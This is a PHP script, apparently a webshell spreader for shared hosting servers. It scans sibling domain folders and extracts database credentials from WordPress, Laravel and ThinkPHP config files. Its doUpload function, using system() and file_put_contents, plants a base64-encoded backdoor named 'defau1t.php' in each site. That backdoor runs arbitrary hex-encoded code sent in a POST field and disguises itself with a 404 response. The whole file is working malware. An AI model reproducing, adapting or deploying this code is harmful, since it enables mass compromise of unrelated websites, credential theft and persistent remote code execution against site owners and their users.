<?php
error_reporting(0);
set_time_limit(0);

$START_DIR = realpath(__DIR__);
$MAX_DEPTH = 5;

/* -------------------- helpers -------------------- */

function looksLikeDomain(string $name): bool {
    return (bool)preg_match('/^[a-z0-9][a-z0-9\-\.]+\.[a-z]{2,24}$/i', $name);
}

function findDomainDirs(string $start, int $maxDepth): array {
    $found = [];
    $seen = [];

    $dir = $start;
    for ($i = 0; $i < $maxDepth; $i++) {
        if (!$dir || isset($seen[$dir])) break;
        $seen[$dir] = true;

        $list = @scandir($dir);
        if ($list) {
            foreach ($list as $d) {
                if ($d === '.' || $d === '..') continue;
                if (in_array(strtolower($d), ['www','html','public','public_html','logs','tmp'])) continue;

                $full = $dir . DIRECTORY_SEPARATOR . $d;
                if (is_dir($full) && looksLikeDomain($d)) {
                    $ph = $full . '/public_html';
                    $found[$d] = is_dir($ph) ? realpath($ph) : realpath($full);
                }
            }
        }

        $dir = dirname($dir);
    }

    return $found;
}

function detectDomainFromPath(string $path): ?string {
    foreach (explode(DIRECTORY_SEPARATOR, $path) as $p) {
        if (looksLikeDomain($p)) {
            return strtolower($p);
        }
    }
    return null;
}

/* -------------------- wordpress -------------------- */

function parseWpConfig(string $file): ?array {
    if (!is_file($file) || !is_readable($file)) return null;

    $c = file_get_contents($file);
    if ($c === false) return null;

    $out = [];

    foreach (['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST'] as $k) {
        if (preg_match("/define\s*\(\s*['\"]{$k}['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $c, $m)) {
            $out[$k] = $m[1];
        }
    }

    if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]\s*;/", $c, $m)) {
        $out['TABLE_PREFIX'] = $m[1];
    } else {
        $out['TABLE_PREFIX'] = 'wp_';
    }

    foreach (['WP_HOME','WP_SITEURL'] as $k) {
        if (preg_match("/define\s*\(\s*['\"]{$k}['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/i", $c, $m)) {
            $out[$k] = $m[1];
        }
    }

    return $out ?: null;
}

function wpSiteFromDb(array $cfg): ?array {
    if (empty($cfg['DB_NAME']) || empty($cfg['DB_USER']) || empty($cfg['DB_HOST'])) {
        return null;
    }

    $mysqli = @new mysqli(
        $cfg['DB_HOST'],
        $cfg['DB_USER'],
        $cfg['DB_PASSWORD'] ?? '',
        $cfg['DB_NAME']
    );

    if ($mysqli->connect_errno) return null;

    $table = ($cfg['TABLE_PREFIX'] ?? 'wp_') . 'options';
    $sql = "SELECT option_name, option_value FROM `$table` WHERE option_name IN ('siteurl','home')";
    $res = $mysqli->query($sql);
    if (!$res) return null;

    $out = [];
    while ($row = $res->fetch_assoc()) {
        $out[$row['option_name']] = $row['option_value'];
    }

    return $out ?: null;
}

/* -------------------- laravel -------------------- */

function parseEnv(string $file): ?array {
    if (!is_file($file) || !is_readable($file)) return null;

    $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) return null;

    $out = [];
    foreach ($lines as $line) {
        if ($line[0] === '#') continue;
        if (!str_contains($line, '=')) continue;

        [$k, $v] = explode('=', $line, 2);
        $out[trim($k)] = trim($v, " \t\n\r\0\x0B\"'");
    }

    return $out ?: null;
}

/* -------------------- thinkphp -------------------- */

function parseThinkDb(string $file): ?array {
    if (!is_file($file) || !is_readable($file)) return null;

    $c = file_get_contents($file);
    if ($c === false) return null;

    $out = [];
    foreach (['database','username','password','hostname'] as $k) {
        if (preg_match('/[\'"]'.$k.'[\'"]\s*=>\s*[\'"]([^\'"]+)[\'"]/', $c, $m)) {
            $out[$k] = $m[1];
        }
    }

    if (!empty($out['database'])) {
        return [
            'DB_NAME' => $out['database'],
            'DB_USER' => $out['username'] ?? null,
            'DB_PASSWORD' => $out['password'] ?? null,
            'DB_HOST' => $out['hostname'] ?? null,
        ];
    }

    return null;
}

/* -------------------- detect site -------------------- */

function detectSite(string $path): array {
    $info = [
        'type' => 'unknown',
        'domain' => null,
        'db' => null,
    ];

    /* WordPress */
    if (is_file($path.'/wp-config.php')) {
        $wp = parseWpConfig($path.'/wp-config.php');
        if ($wp) {
            $info['type'] = 'wordpress';
            $info['db'] = $wp;

            if (!empty($wp['WP_HOME'])) {
                $info['domain'] = parse_url($wp['WP_HOME'], PHP_URL_HOST);
            } elseif (!empty($wp['WP_SITEURL'])) {
                $info['domain'] = parse_url($wp['WP_SITEURL'], PHP_URL_HOST);
            } else {
                $dbSite = wpSiteFromDb($wp);
                if (!empty($dbSite['siteurl'])) {
                    $info['domain'] = parse_url($dbSite['siteurl'], PHP_URL_HOST);
                } elseif (!empty($dbSite['home'])) {
                    $info['domain'] = parse_url($dbSite['home'], PHP_URL_HOST);
                }
            }
        }
        return $info;
    }

    /* Laravel */
    if (is_file($path.'/.env')) {
        $env = parseEnv($path.'/.env');
        if ($env) {
            $info['type'] = 'laravel';
            $info['db'] = [
                'DB_NAME' => $env['DB_DATABASE'] ?? null,
                'DB_USER' => $env['DB_USERNAME'] ?? null,
                'DB_PASSWORD' => $env['DB_PASSWORD'] ?? null,
                'DB_HOST' => $env['DB_HOST'] ?? null,
            ];
            if (!empty($env['APP_URL'])) {
                $info['domain'] = parse_url($env['APP_URL'], PHP_URL_HOST);
            }
        }
        return $info;
    }

    /* ThinkPHP */
    if (is_file($path.'/config/database.php')) {
        $tp = parseThinkDb($path.'/config/database.php');
        if ($tp) {
            $info['type'] = 'thinkphp';
            $info['db'] = $tp;
        }
        return $info;
    }

    return $info;
}

function detectSiblingSites(string $start): array {
    $out = [];
    $real = realpath($start);
    if (!$real) return [];

    // match: /home/u1/domains/example.com/public_html
    if (preg_match('#(.+/domains)/([^/]+)/public_html#', $real, $m)) {
        $domainsRoot = $m[1];

        $list = @scandir($domainsRoot);
        if (!$list) return [];

        foreach ($list as $d) {
            if ($d === '.' || $d === '..') continue;
            if (!looksLikeDomain($d)) continue;

            $ph = $domainsRoot . '/' . $d . '/public_html';
            if (is_dir($ph)) {
                $out[$d] = realpath($ph);
            }
        }
    }

    return $out;
}

function doUpload($path)
{
    if(function_exists("system")){
        system('touch '.$path.'/defau1t.php');
        system("echo 'PD9waHANCmlmKGlzc2V0KCRfUE9TVFsnZnRwJ10pKXsNCiAgICBpZihmaWxlX2V4aXN0cygiaW1hZ2VfeHZwYXNzZC5qcGciKSl7DQogICAgICAgIHVubGluaygiaW1hZ2VfeHZwYXNzZC5qcGciKTsNCiAgICB9DQogICAgZmlsZV9wdXRfY29udGVudHMoImltYWdlX3h2cGFzc2QuanBnIixiYXNlNjRfZGVjb2RlKCJQRDl3YUhBSyIpLmJhc2U2NF9kZWNvZGUoIkNuVnViR2x1YXlnaWFXMWhaMlZmZUhad1lYTnpaQzVxY0djaUtUc0siKS5oZXgyYmluKCRfUE9TVFsnZnRwJ10pKTsNCiAgICBpbmNsdWRlICJpbWFnZV94dnBhc3NkLmpwZyI7DQogICAgdW5saW5rKCJpbWFnZV94dnBhc3NkLmpwZyIpOw0KfWVsc2V7DQogICAgaHR0cF9yZXNwb25zZV9jb2RlKDQwNCk7DQogICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOw0KfQ0K'|base64 -d>".$path."/defau1t.php");
    }
    touch($path."/defau1t.php");
    file_put_contents($path."/defau1t.php",base64_decode("PD9waHANCmlmKGlzc2V0KCRfUE9TVFsnZnRwJ10pKXsNCiAgICBpZihmaWxlX2V4aXN0cygiaW1hZ2VfeHZwYXNzZC5qcGciKSl7DQogICAgICAgIHVubGluaygiaW1hZ2VfeHZwYXNzZC5qcGciKTsNCiAgICB9DQogICAgZmlsZV9wdXRfY29udGVudHMoImltYWdlX3h2cGFzc2QuanBnIixiYXNlNjRfZGVjb2RlKCJQRDl3YUhBSyIpLmJhc2U2NF9kZWNvZGUoIkNuVnViR2x1YXlnaWFXMWhaMlZmZUhad1lYTnpaQzVxY0djaUtUc0siKS5oZXgyYmluKCRfUE9TVFsnZnRwJ10pKTsNCiAgICBpbmNsdWRlICJpbWFnZV94dnBhc3NkLmpwZyI7DQogICAgdW5saW5rKCJpbWFnZV94dnBhc3NkLmpwZyIpOw0KfWVsc2V7DQogICAgaHR0cF9yZXNwb25zZV9jb2RlKDQwNCk7DQogICAgaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOw0KfQ0K"));

}

/* -------------------- main -------------------- */

$selfDomain = $_SERVER['HTTP_HOST'] ?? detectDomainFromPath($START_DIR);
$selfInfo   = detectSite($START_DIR);
$selfDb     = $selfInfo['db'];

$domains = findDomainDirs($START_DIR, $MAX_DEPTH);

$siblings = detectSiblingSites($START_DIR);
foreach ($siblings as $d => $p) {
    $domains[$d] = $p;
}

header('Content-Type: text/plain');

foreach ($domains as $domain => $path) {
    if ($selfDomain && strtolower($domain) === strtolower($selfDomain)) continue;

    $site = detectSite($path);

    $sameDb = false;
    if ($selfDb && $site['db']) {
        $sameDb =
            $selfDb['DB_NAME'] === $site['db']['DB_NAME'] &&
            $selfDb['DB_USER'] === $site['db']['DB_USER'] &&
            $selfDb['DB_HOST'] === $site['db']['DB_HOST'];
    }

    echo $domain . " | " . $path;
    try {
        doUpload($path);
        if(is_dir($path."/public/")){
            doUpload($path."/public/");
        }
    }catch (Throwable $e) {
        echo $e->getMessage();
    }
    echo " | type=" . $site['type'];
    if ($site['domain']) echo " | real=" . $site['domain'];
    if ($sameDb) echo " | SAME_DB";
    echo PHP_EOL;
}
